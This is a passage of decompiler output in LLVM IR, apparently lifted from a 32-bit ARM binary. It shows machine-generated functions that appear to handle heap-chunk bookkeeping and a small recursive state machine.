  %v2_12130 = add i32 %v1_12130, 8
  %v3_12130 = inttoptr i32 %v2_12130 to i32*
  store i32 %v7_1212c, i32* %v3_12130, align 4
  %v0_12134 = load i32, i32* @r5, align 4
  %v1_12134 = load i32, i32* %r2.global-to-local, align 4
  %v2_12134 = load i32, i32* %r1.global-to-local, align 4
  %v5_12134 = mul i32 %v2_12134, 4
  %v6_12134 = add i32 %v5_12134, %v1_12134
  %v7_12134 = inttoptr i32 %v6_12134 to i32*
  store i32 %v0_12134, i32* %v7_12134, align 4
  br label %dec_label_pc_122a0

dec_label_pc_1213c:                               ; preds = %dec_label_pc_120bc
  %v1_1213c = and i32 %v3_12100, 2
  %v2_1213c = icmp eq i32 %v1_1213c, 0
  br i1 %v2_1213c, label %dec_label_pc_12144, label %dec_label_pc_12278

dec_label_pc_12144:                               ; preds = %dec_label_pc_1213c
  %v1_12144 = or i32 %v2_12104, 1
  store i32 %v1_12144, i32* %r3.global-to-local, align 4
  store i32 %v1_12144, i32* %v1_12104, align 4
  %v0_1214c = load i32, i32* @r6, align 4
  %v1_1214c = add i32 %v0_1214c, -4
  %v2_1214c = inttoptr i32 %v1_1214c to i32*
  %v3_1214c = load i32, i32* %v2_1214c, align 4
  store i32 %v3_1214c, i32* %r3.global-to-local, align 4
  %v0_12150 = load i32, i32* @r5, align 4
  %v1_12150 = load i32, i32* %ip.global-to-local, align 4
  %v2_12150 = add i32 %v1_12150, %v0_12150
  store i32 %v2_12150, i32* %lr.global-to-local, align 4
  %v1_12154 = urem i32 %v3_1214c, 2
  %v2_12154 = icmp eq i32 %v1_12154, 0
  %v1_12158 = add i32 %v2_12150, 4
  %v2_12158 = inttoptr i32 %v1_12158 to i32*
  %v3_12158 = load i32, i32* %v2_12158, align 4
  store i32 %v3_12158, i32* %r8.global-to-local, align 4
  br i1 %v2_12154, label %dec_label_pc_12160, label %dec_label_pc_12194

dec_label_pc_12160:                               ; preds = %dec_label_pc_12144
  %v1_12160 = add i32 %v0_1214c, -8
  %v2_12160 = inttoptr i32 %v1_12160 to i32*
  %v3_12160 = load i32, i32* %v2_12160, align 4
  store i32 %v3_12160, i32* %r1.global-to-local, align 4
  %v2_12164 = sub i32 %v0_12150, %v3_12160
  store i32 %v2_12164, i32* %r3.global-to-local, align 4
  %v1_12168 = add i32 %v2_12164, 8
  %v2_12168 = inttoptr i32 %v1_12168 to i32*
  %v3_12168 = load i32, i32* %v2_12168, align 4
  store i32 %v3_12168, i32* %r2.global-to-local, align 4
  %v1_1216c = add i32 %v3_12168, 12
  %v2_1216c = inttoptr i32 %v1_1216c to i32*
  %v3_1216c = load i32, i32* %v2_1216c, align 4
  store i32 %v3_1216c, i32* %r4.global-to-local, align 4
  %v9_12170 = icmp eq i32 %v3_1216c, %v2_12164
  %v1_12174 = add i32 %v2_12164, 12
  %v2_12174 = inttoptr i32 %v1_12174 to i32*
  %v3_12174 = load i32, i32* %v2_12174, align 4
  store i32 %v3_12174, i32* %r0.global-to-local, align 4
  br i1 %v9_12170, label %dec_label_pc_1217c, label %dec_label_pc_121e0

dec_label_pc_1217c:                               ; preds = %dec_label_pc_12160
  %v1_1217c = add i32 %v3_12174, 8
  %v2_1217c = inttoptr i32 %v1_1217c to i32*
  %v3_1217c = load i32, i32* %v2_1217c, align 4
  store i32 %v3_1217c, i32* %r3.global-to-local, align 4
  %v9_12180 = icmp eq i32 %v3_1217c, %v2_12164
  br i1 %v9_12180, label %dec_label_pc_12188, label %dec_label_pc_121e0

dec_label_pc_12188:                               ; preds = %dec_label_pc_1217c
  store i32 %v3_12168, i32* %v2_1217c, align 4
  %v0_1218c = load i32, i32* %r0.global-to-local, align 4
  %v1_1218c = load i32, i32* %r2.global-to-local, align 4
  %v2_1218c = add i32 %v1_1218c, 12
  %v3_1218c = inttoptr i32 %v2_1218c to i32*
  store i32 %v0_1218c, i32* %v3_1218c, align 4
  %v0_12190 = load i32, i32* %ip.global-to-local, align 4
  %v1_12190 = load i32, i32* %r1.global-to-local, align 4
  %v2_12190 = add i32 %v1_12190, %v0_12190
  store i32 %v2_12190, i32* %ip.global-to-local, align 4
  %v0_121a0.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_121a4.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_12194

dec_label_pc_12194:                               ; preds = %dec_label_pc_12144, %dec_label_pc_12188
  %v0_12220 = phi i32 [ %v1_12150, %dec_label_pc_12144 ], [ %v2_12190, %dec_label_pc_12188 ]
  %v0_121a4 = phi i32 [ %v3_12158, %dec_label_pc_12144 ], [ %v0_121a4.pre, %dec_label_pc_12188 ]
  %v1_121b8 = phi i32 [ %v2_12150, %dec_label_pc_12144 ], [ %v0_121a0.pre, %dec_label_pc_12188 ]
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_12198 = load i32, i32* @r7, align 4
  %v2_12198 = add i32 %v0_12198, 32
  %v3_12198 = inttoptr i32 %v2_12198 to i32*
  %v4_12198 = load i32, i32* %v3_12198, align 4
  store i32 %v4_12198, i32* %r2.global-to-local, align 4
  %v1_1219c = add i32 %v4_12198, 44
  %v2_1219c = inttoptr i32 %v1_1219c to i32*
  %v3_1219c = load i32, i32* %v2_1219c, align 4
  store i32 %v3_1219c, i32* %r3.global-to-local, align 4
  %v9_121a0 = icmp eq i32 %v1_121b8, %v3_1219c
  %v1_121a4 = and i32 %v0_121a4, -4
  store i32 %v1_121a4, i32* %r0.global-to-local, align 4
  br i1 %v9_121a0, label %dec_label_pc_12220, label %dec_label_pc_121ac

dec_label_pc_121ac:                               ; preds = %dec_label_pc_12194
  %v2_121ac = add i32 %v1_121b8, %v1_121a4
  store i32 %v2_121ac, i32* %r3.global-to-local, align 4
  %v1_121b0 = add i32 %v2_121ac, 4
  %v2_121b0 = inttoptr i32 %v1_121b0 to i32*
  %v3_121b0 = load i32, i32* %v2_121b0, align 4
  store i32 %v3_121b0, i32* %r3.global-to-local, align 4
  %v1_121b4 = urem i32 %v3_121b0, 2
  %v2_121b4 = icmp eq i32 %v1_121b4, 0
  %v2_121b8 = add i32 %v1_121b8, 4
  %v3_121b8 = inttoptr i32 %v2_121b8 to i32*
  store i32 %v1_121a4, i32* %v3_121b8, align 4
  br i1 %v2_121b4, label %dec_label_pc_121c0, label %dec_label_pc_121ac.dec_label_pc_121f0_crit_edge

dec_label_pc_121ac.dec_label_pc_121f0_crit_edge:  ; preds = %dec_label_pc_121ac
  %v0_12200.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_121f0

dec_label_pc_121c0:                               ; preds = %dec_label_pc_121ac
  %v0_121c0 = load i32, i32* %lr.global-to-local, align 4
  %v1_121c0 = add i32 %v0_121c0, 8
  %v2_121c0 = inttoptr i32 %v1_121c0 to i32*
  %v3_121c0 = load i32, i32* %v2_121c0, align 4
  store i32 %v3_121c0, i32* %r1.global-to-local, align 4
  %v1_121c4 = add i32 %v3_121c0, 12
  %v2_121c4 = inttoptr i32 %v1_121c4 to i32*
  %v3_121c4 = load i32, i32* %v2_121c4, align 4
  store i32 %v3_121c4, i32* %r3.global-to-local, align 4
  %v9_121c8 = icmp eq i32 %v3_121c4, %v0_121c0
  %v1_121cc = add i32 %v0_121c0, 12
  %v2_121cc = inttoptr i32 %v1_121cc to i32*
  %v3_121cc = load i32, i32* %v2_121cc, align 4
  store i32 %v3_121cc, i32* %r2.global-to-local, align 4
  br i1 %v9_121c8, label %dec_label_pc_121d4, label %dec_label_pc_121e0

dec_label_pc_121d4:                               ; preds = %dec_label_pc_121c0
  %v1_121d4 = add i32 %v3_121cc, 8
  %v2_121d4 = inttoptr i32 %v1_121d4 to i32*
  %v3_121d4 = load i32, i32* %v2_121d4, align 4
  store i32 %v3_121d4, i32* %r3.global-to-local, align 4
  %v9_121d8 = icmp eq i32 %v3_121d4, %v0_121c0
  br i1 %v9_121d8, label %dec_label_pc_121e4, label %dec_label_pc_121e0

dec_label_pc_121e0:                               ; preds = %dec_label_pc_121c0, %dec_label_pc_1217c, %dec_label_pc_12160, %dec_label_pc_121d4
  %v0_121e0 = call i32 @function_12320()
  store i32 %v0_121e0, i32* %r0.global-to-local, align 4
  %v0_121e4.pre = load i32, i32* @r1, align 4
  %v1_121e4.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_121e4

dec_label_pc_121e4:                               ; preds = %dec_label_pc_121d4, %dec_label_pc_121e0
  %v1_121e4 = phi i32 [ %v3_121cc, %dec_label_pc_121d4 ], [ %v1_121e4.pre, %dec_label_pc_121e0 ]
  %v0_121e4 = phi i32 [ %v3_121c0, %dec_label_pc_121d4 ], [ %v0_121e4.pre, %dec_label_pc_121e0 ]
  %v2_121e4 = add i32 %v1_121e4, 8
  %v3_121e4 = inttoptr i32 %v2_121e4 to i32*
  store i32 %v0_121e4, i32* %v3_121e4, align 4
  %v0_121e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_121e8 = load i32, i32* %r1.global-to-local, align 4
  %v2_121e8 = add i32 %v1_121e8, 12
  %v3_121e8 = inttoptr i32 %v2_121e8 to i32*
  store i32 %v0_121e8, i32* %v3_121e8, align 4
  %v0_121ec = load i32, i32* %ip.global-to-local, align 4
  %v1_121ec = load i32, i32* %r0.global-to-local, align 4
  %v2_121ec = add i32 %v1_121ec, %v0_121ec
  store i32 %v2_121ec, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_121f0

dec_label_pc_121f0:                               ; preds = %dec_label_pc_121ac.dec_label_pc_121f0_crit_edge, %dec_label_pc_121e4
  %v0_12200 = phi i32 [ %v0_12200.pre, %dec_label_pc_121ac.dec_label_pc_121f0_crit_edge ], [ %v2_121ec, %dec_label_pc_121e4 ]
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_121f4 = load i32, i32* @r7, align 4
  %v2_121f4 = add i32 %v0_121f4, 32
  %v3_121f4 = inttoptr i32 %v2_121f4 to i32*
  %v4_121f4 = load i32, i32* %v3_121f4, align 4
  %v1_121f8 = add i32 %v4_121f4, 52
  store i32 %v1_121f8, i32* %r3.global-to-local, align 4
  %v1_121fc = add i32 %v4_121f4, 60
  %v2_121fc = inttoptr i32 %v1_121fc to i32*
  %v3_121fc = load i32, i32* %v2_121fc, align 4
  store i32 %v3_121fc, i32* %r1.global-to-local, align 4
  %v1_12200 = or i32 %v0_12200, 1
  store i32 %v1_12200, i32* %r2.global-to-local, align 4
  %v1_12204 = load i32, i32* %r4.global-to-local, align 4
  %v2_12204 = add i32 %v1_12204, 12
  %v3_12204 = inttoptr i32 %v2_12204 to i32*
  store i32 %v1_121f8, i32* %v3_12204, align 4
  %v0_12208 = load i32, i32* %r1.global-to-local, align 4
  %v1_12208 = load i32, i32* %r4.global-to-local, align 4
  %v2_12208 = add i32 %v1_12208, 8
  %v3_12208 = inttoptr i32 %v2_12208 to i32*
  store i32 %v0_12208, i32* %v3_12208, align 4
  %v0_1220c = load i32, i32* %r2.global-to-local, align 4
  %v1_1220c = load i32, i32* %r4.global-to-local, align 4
  %v2_1220c = add i32 %v1_1220c, 4
  %v3_1220c = inttoptr i32 %v2_1220c to i32*
  store i32 %v0_1220c, i32* %v3_1220c, align 4
  %v0_12210 = load i32, i32* %ip.global-to-local, align 4
  %v1_12210 = load i32, i32* %r4.global-to-local, align 4
  %v3_12210 = add i32 %v1_12210, %v0_12210
  %v4_12210 = inttoptr i32 %v3_12210 to i32*
  store i32 %v0_12210, i32* %v4_12210, align 4
  %v0_12214 = load i32, i32* %r4.global-to-local, align 4
  %v1_12214 = load i32, i32* %r1.global-to-local, align 4
  %v2_12214 = add i32 %v1_12214, 12
  %v3_12214 = inttoptr i32 %v2_12214 to i32*
  store i32 %v0_12214, i32* %v3_12214, align 4
  %v0_12218 = load i32, i32* %r4.global-to-local, align 4
  %v1_12218 = load i32, i32* %r3.global-to-local, align 4
  %v2_12218 = add i32 %v1_12218, 8
  %v3_12218 = inttoptr i32 %v2_12218 to i32*
  store i32 %v0_12218, i32* %v3_12218, align 4
  br label %dec_label_pc_12230

dec_label_pc_12220:                               ; preds = %dec_label_pc_12194
  %v2_12220 = add i32 %v1_121a4, %v0_12220
  store i32 %v2_12220, i32* %ip.global-to-local, align 4
  %v1_12224 = or i32 %v2_12220, 1
  store i32 %v1_12224, i32* %r3.global-to-local, align 4
  %v0_12228 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12228, i32* %v2_1219c, align 4
  %v0_1222c = load i32, i32* %r3.global-to-local, align 4
  %v1_1222c = load i32, i32* %r4.global-to-local, align 4
  %v2_1222c = add i32 %v1_1222c, 4
  %v3_1222c = inttoptr i32 %v2_1222c to i32*
  store i32 %v0_1222c, i32* %v3_1222c, align 4
  br label %dec_label_pc_12230

dec_label_pc_12230:                               ; preds = %dec_label_pc_121f0, %dec_label_pc_12220
  %v0_12230 = load i32, i32* %ip.global-to-local, align 4
  %v3_12234 = icmp ult i32 %v0_12230, 131070
  br i1 %v3_12234, label %dec_label_pc_122a0, label %dec_label_pc_12238

dec_label_pc_12238:                               ; preds = %dec_label_pc_12230
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_1223c = load i32, i32* @r7, align 4
  %v2_1223c = add i32 %v0_1223c, 32
  %v3_1223c = inttoptr i32 %v2_1223c to i32*
  %v4_1223c = load i32, i32* %v3_1223c, align 4
  store i32 %v4_1223c, i32* @r4, align 4
  %v1_12240 = inttoptr i32 %v4_1223c to i32*
  %v2_12240 = load i32, i32* %v1_12240, align 4
  store i32 %v2_12240, i32* %r3.global-to-local, align 4
  %v1_12244 = and i32 %v2_12240, 2
  %v2_12244 = icmp eq i32 %v1_12244, 0
  br i1 %v2_12244, label %bb15, label %bb

bb:                                               ; preds = %dec_label_pc_12238
  store i32 %v4_1223c, i32* %r0.global-to-local, align 4
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_12238, %bb
  store i32 74320, i32* @lr, align 4
  %v1_1224c = xor i1 %v2_12244, true
  call void @__pseudo_cond_branch(i1 %v1_1224c, i32 ptrtoint (i32* @global_var_11ef0.413 to i32))
  %v0_12250 = load i32, i32* @r4, align 4
  %v1_12250 = add i32 %v0_12250, 44
  %v2_12250 = inttoptr i32 %v1_12250 to i32*
  %v3_12250 = load i32, i32* %v2_12250, align 4
  store i32 %v3_12250, i32* %r3.global-to-local, align 4
  %v1_12254 = add i32 %v3_12250, 4
  %v2_12254 = inttoptr i32 %v1_12254 to i32*
  %v3_12254 = load i32, i32* %v2_12254, align 4
  store i32 %v3_12254, i32* %r3.global-to-local, align 4
  %v1_12258 = add i32 %v0_12250, 836
  %v2_12258 = inttoptr i32 %v1_12258 to i32*
  %v3_12258 = load i32, i32* %v2_12258, align 4
  store i32 %v3_12258, i32* %r2.global-to-local, align 4
  %v1_1225c = and i32 %v3_12254, -4
  store i32 %v1_1225c, i32* %r3.global-to-local, align 4
  %v3_12260 = icmp ult i32 %v1_1225c, %v3_12258
  br i1 %v3_12260, label %dec_label_pc_122a0, label %dec_label_pc_12268

dec_label_pc_12268:                               ; preds = %bb15
  store i32 %v0_12250, i32* %r1.global-to-local, align 4
  %v1_1226c = add i32 %v0_12250, 840
  %v2_1226c = inttoptr i32 %v1_1226c to i32*
  %v3_1226c = load i32, i32* %v2_1226c, align 4
  store i32 %v3_1226c, i32* %r0.global-to-local, align 4
  %v2_12270 = call i32 @function_11e40(i32 %v3_1226c, i32 %v0_12250)
  store i32 %v2_12270, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_122a0

dec_label_pc_12278:                               ; preds = %dec_label_pc_1213c
  %v2_12278 = inttoptr i32 %v1_1210c to i32*
  %v3_12278 = load i32, i32* %v2_12278, align 4
  store i32 %v3_12278, i32* %r0.global-to-local, align 4
  %v1_1227c = add i32 %v4_120fc, 848
  %v2_1227c = inttoptr i32 %v1_1227c to i32*
  %v3_1227c = load i32, i32* %v2_1227c, align 4
  store i32 %v3_1227c, i32* %r2.global-to-local, align 4
  %v1_12280 = add i32 %v4_120fc, 868
  %v2_12280 = inttoptr i32 %v1_12280 to i32*
  %v3_12280 = load i32, i32* %v2_12280, align 4
  %v2_12284 = add i32 %v3_12278, %v1_12108
  store i32 %v2_12284, i32* %r1.global-to-local, align 4
  %v1_12288 = add i32 %v3_1227c, -1
  store i32 %v1_12288, i32* %r2.global-to-local, align 4
  %v2_1228c = sub i32 %v3_12280, %v2_12284
  store i32 %v2_1228c, i32* %r3.global-to-local, align 4
  store i32 %v2_1228c, i32* %v2_12280, align 4
  %v1_12294 = load i32, i32* @lr, align 4
  %v2_12294 = add i32 %v1_12294, 848
  %v3_12294 = inttoptr i32 %v2_12294 to i32*
  store i32 %v1_12288, i32* %v3_12294, align 4
  %v0_12298 = load i32, i32* %r0.global-to-local, align 4
  %v1_12298 = load i32, i32* @r5, align 4
  %v2_12298 = sub i32 %v1_12298, %v0_12298
  store i32 %v2_12298, i32* %r0.global-to-local, align 4
  %v4_1229c = call i32 @function_13888(i32 %v2_12298, i32 %v2_12284, i32 %v1_12288, i32 %v2_1228c)
  store i32 %v4_1229c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_122a0

dec_label_pc_122a0:                               ; preds = %bb15, %dec_label_pc_12230, %dec_label_pc_12268, %dec_label_pc_1211c, %dec_label_pc_12278
  store i32 %v2_120b0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v0_122ac = load i32, i32* @r7, align 4
  %v2_122ac = add i32 %v0_122ac, 24
  %v3_122ac = inttoptr i32 %v2_122ac to i32*
  %v4_122ac = load i32, i32* %v3_122ac, align 4
  store i32 %v4_122ac, i32* @ip, align 4
  store i32 74424, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_122ac)
  br label %dec_label_pc_122b8

dec_label_pc_122b8:                               ; preds = %dec_label_pc_120a4, %dec_label_pc_122a0
  store i32 %v3_120a4, i32* @r4, align 4
  store i32 %v6_120a4, i32* @r5, align 4
  store i32 %v9_120a4, i32* @r6, align 4
  store i32 %v12_120a4, i32* @r7, align 4
  store i32 %v18_120a4, i32* @lr, align 4
  ret i32 %v2_120b0

; uselistorder directives
  uselistorder i32 %v0_12250, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_12210, { 1, 0 }
  uselistorder i32 %v1_12150, { 1, 0 }
  uselistorder i32 %v0_12150, { 1, 0 }
  uselistorder i32 %v3_12124, { 1, 0 }
  uselistorder i32 %v1_12108, { 1, 0, 2 }
  uselistorder i32 %v2_12104, { 1, 2, 0, 3 }
  uselistorder i32 %v4_120fc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_120ac, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %r0.global-to-local, { 4, 14, 1, 2, 3, 0, 5, 6, 12, 13, 7, 8, 9, 11, 10 }
  uselistorder i32* %lr.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 4, 0, 5, 1, 6, 3, 2, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 868, { 2, 0, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_122b8, { 1, 0 }
  uselistorder label %dec_label_pc_122a0, { 4, 2, 0, 1, 3 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_12230, { 1, 0 }
  uselistorder label %dec_label_pc_121f0, { 1, 0 }
  uselistorder label %dec_label_pc_121e4, { 1, 0 }
  uselistorder label %dec_label_pc_121e0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_12194, { 1, 0 }
}

define i32 @function_122c8(i32 %arg1) local_unnamed_addr {
dec_label_pc_122c8:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_122c8 = load i1, i1* @cpsr_z, align 1
  %v2_122c8 = load i32, i32* @r4, align 4
  br i1 %v0_122c8, label %bb, label %dec_label_pc_122c8..thread4_crit_edge

dec_label_pc_122c8..thread4_crit_edge:            ; preds = %dec_label_pc_122c8
  %v0_122f4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread4

bb:                                               ; preds = %dec_label_pc_122c8
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_122c8..thread4_crit_edge, %bb
  %v0_122f4 = phi i32 [ %v0_122f4.pre, %dec_label_pc_122c8..thread4_crit_edge ], [ 0, %bb ]
  store i32 %v2_122c8, i32* %stack_var_-12, align 4
  %v6_122e0 = load i32, i32* @r5, align 4
  %v9_122e0 = load i32, i32* @lr, align 4
  %v4_122f0 = load i32, i32* inttoptr (i32 123796 to i32*), align 4
  store i32 %v4_122f0, i32* @r5, align 4
  store i32 %v0_122f4, i32* @r4, align 4
  store i32 %v4_122f0, i32* @r0, align 4
  %v0_12300 = call i32 @function_11ef0()
  %v0_12304 = load i32, i32* @r4, align 4
  store i32 %v0_12304, i32* %r0.global-to-local, align 4
  %v0_12308 = load i32, i32* @r5, align 4
  %v2_12310 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_12310, i32* @r4, align 4
  store i32 %v6_122e0, i32* @r5, align 4
  store i32 %v9_122e0, i32* @lr, align 4
  %v2_12314 = call i32 @function_11e40(i32 %v0_12304, i32 %v0_12308)
  store i32 %v2_12314, i32* %r0.global-to-local, align 4
  %v0_12318 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12318, label %bb13, label %.thread5

bb13:                                             ; preds = %.thread4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread5

.thread5:                                         ; preds = %.thread4, %bb13
  %v4_1231c = phi i32 [ %v2_12314, %.thread4 ], [ 0, %bb13 ]
  ret i32 %v4_1231c

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 5, 3, 4, 0, 1 }
  uselistorder i32 (i32, i32)* @function_11e40, { 1, 0 }
  uselistorder i32 ()* @function_11ef0, { 3, 2, 1, 0 }
  uselistorder i32* inttoptr (i32 123796 to i32*), { 17, 2, 1, 7, 8, 9, 10, 11, 6, 12, 5, 13, 0, 14, 15, 4, 16, 3 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @function_12320() local_unnamed_addr {
dec_label_pc_12320:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 123764, i32* @r5, align 4
  %v4_12338 = load i32, i32* inttoptr (i32 123780 to i32*), align 4
  store i32 74564, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_12338)
  %v2_12354 = ptrtoint i32* %stack_var_-8 to i32
  store i32 32, i32* %stack_var_-8, align 4
  %v3_12360 = call i32 @function_105d0(i32 1, i32 %v2_12354, i32 0)
  %v4_12368 = load i32, i32* @global_var_1e5d0.421, align 4
  %v2_1236c = icmp eq i32 %v4_12368, 0
  br i1 %v2_1236c, label %dec_label_pc_12374, label %dec_label_pc_123b4

dec_label_pc_12374:                               ; preds = %dec_label_pc_12320
  store i32 1, i32* @global_var_1e5d0.421, align 4
  br label %dec_label_pc_1237c

dec_label_pc_1237c:                               ; preds = %dec_label_pc_123c4, %dec_label_pc_12374
  %v0_12380 = load i32, i32* @r5, align 4
  %v2_12380 = add i32 %v0_12380, 160
  store i32 %v2_12380, i32* @r4, align 4
  %v2_1238c = add i32 %v0_12380, 36
  %v3_1238c = inttoptr i32 %v2_1238c to i32*
  %v4_1238c = load i32, i32* %v3_1238c, align 4
  call void @__pseudo_branch(i32 %v4_1238c)
  %v1_1239c = call i32 @function_10e28(i32 6)
  %v0_123a8 = load i32, i32* @r5, align 4
  %v2_123a8 = add i32 %v0_123a8, 16
  %v3_123a8 = inttoptr i32 %v2_123a8 to i32*
  %v4_123a8 = load i32, i32* %v3_123a8, align 4
  store i32 74676, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_123a8)
  %v4_123b8.pre = load i32, i32* @global_var_1e5d0.421, align 4
  br label %dec_label_pc_123b4

dec_label_pc_123b4:                               ; preds = %dec_label_pc_12320, %dec_label_pc_1237c
  %v0_123c8 = phi i32 [ %v4_12368, %dec_label_pc_12320 ], [ %v4_123b8.pre, %dec_label_pc_1237c ]
  %v7_123bc = icmp eq i32 %v0_123c8, 1
  br i1 %v7_123bc, label %dec_label_pc_123c4, label %dec_label_pc_12400

dec_label_pc_123c4:                               ; preds = %dec_label_pc_123b4
  %v2_123c4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_123c4, i32* @r4, align 4
  store i32 2, i32* @global_var_1e5d0.421, align 4
  store i32 20, i32* @r2, align 4
  %v2_123dc = bitcast i32* %stack_var_-28 to i8*
  %v3_123dc = call i32 @function_10a80(i8* %v2_123dc, i32 0)
  %v3_123f8 = call i32 @function_13388(i32 6, i32 %v2_123c4, i32 0)
  br label %dec_label_pc_1237c

dec_label_pc_12400:                               ; preds = %dec_label_pc_123b4
  %v7_12400 = icmp eq i32 %v0_123c8, 2
  br i1 %v7_12400, label %dec_label_pc_12408, label %dec_label_pc_12414

dec_label_pc_12408:                               ; preds = %dec_label_pc_12400
  store i32 3, i32* @global_var_1e5d0.421, align 4
  %v0_12410 = call i32 @function_12320()
  %v4_12414.pre = load i32, i32* @global_var_1e5d0.421, align 4
  br label %dec_label_pc_12414

dec_label_pc_12414:                               ; preds = %dec_label_pc_12400, %dec_label_pc_12408
  %v1_1241c = phi i32 [ %v0_123c8, %dec_label_pc_12400 ], [ %v4_12414.pre, %dec_label_pc_12408 ]
  %v7_12418 = icmp eq i32 %v1_1241c, 3
  br i1 %v7_12418, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_12414
  store i32 4, i32* @global_var_1e5d0.421, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_12414, %bb
  call void @__pseudo_cond_branch(i1 %v7_12418, i32 ptrtoint (i32* @global_var_13978.423 to i32))
  br label %dec_label_pc_1242c

dec_label_pc_1242c:                               ; preds = %dec_label_pc_1242c, %.thread1
  %v0_1242c = call i32 @function_12320()
  br label %dec_label_pc_1242c

; uselistorder directives
  uselistorder i32 ()* @function_12320, { 1, 0, 5, 4, 6, 3, 2 }
  uselistorder i32 6, { 12, 13, 64, 14, 34, 0, 1, 15, 16, 17, 18, 19, 20, 21, 22, 23, 4, 2, 24, 25, 26, 27, 5, 28, 35, 36, 37, 6, 38, 7, 39, 40, 29, 41, 8, 42, 43, 44, 30, 45, 9, 46, 47, 48, 31, 49, 50, 51, 52, 53, 32, 54, 10, 55, 56, 57, 58, 59, 60, 33, 61, 11, 62, 63, 3 }
  uselistorder i32* @global_var_1e5d0.421, { 2, 0, 3, 4, 1, 5, 6 }
  uselistorder i32* inttoptr (i32 123780 to i32*), { 2, 0, 1 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_12414, { 1, 0 }
  uselistorder label %dec_label_pc_123b4, { 1, 0 }
}

define i32 @function_12438(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12438:
  %v0_12438 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12438, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_12438
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_12438, %bb
  %v4_12444 = phi i32 [ %arg1, %dec_label_pc_12438 ], [ 0, %bb ]
  ret i32 %v4_12444

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_12448(i32 %arg1) local_unnamed_addr {
dec_label_pc_12448:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_12458 = call i32 @function_12468()
  ret i32 %v0_12458
}

define i32 @function_12468() local_unnamed_addr {
dec_label_pc_12468:
  store i32 1, i32* @r3, align 4
  %v0_12474 = call i32 @function_12484()
  ret i32 %v0_12474
}

define i32 @function_12484() local_unnamed_addr {
dec_label_pc_12484:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %v3_12484 = load i32, i32* @r4, align 4
  store i32 224, i32* @lr, align 4
  store i32 123764, i32* %ip.global-to-local, align 4
  %v0_12498 = load i32, i32* @r1, align 4
  store i32 %v0_12498, i32* %fp.global-to-local, align 4
  %v0_1249c = load i32, i32* @r2, align 4
  store i32 %v0_1249c, i32* %r5.global-to-local, align 4
  %v0_124a0 = load i32, i32* @r0, align 4
  store i32 %v0_124a0, i32* @r4, align 4
  %v0_124a4 = load i32, i32* @r3, align 4
  br label %dec_label_pc_124b0

dec_label_pc_124ac:                               ; preds = %dec_label_pc_124b0
  %v1_124ac = add i32 %v0_124e8, 1
  store i32 %v1_124ac, i32* @r4, align 4
  br label %dec_label_pc_124b0

dec_label_pc_124b0:                               ; preds = %dec_label_pc_12484, %dec_label_pc_124ac
  %v0_124e8 = phi i32 [ %v0_124a0, %dec_label_pc_12484 ], [ %v1_124ac, %dec_label_pc_124ac ]
  %v1_124b0 = inttoptr i32 %v0_124e8 to i8*
  %v2_124b0 = load i8, i8* %v1_124b0, align 1
  %v3_124b0 = zext i8 %v2_124b0 to i32
  %v4_124b4 = load i32, i32* inttoptr (i32 123988 to i32*), align 4
  %v2_124b8 = mul nuw nsw i32 %v3_124b0, 2
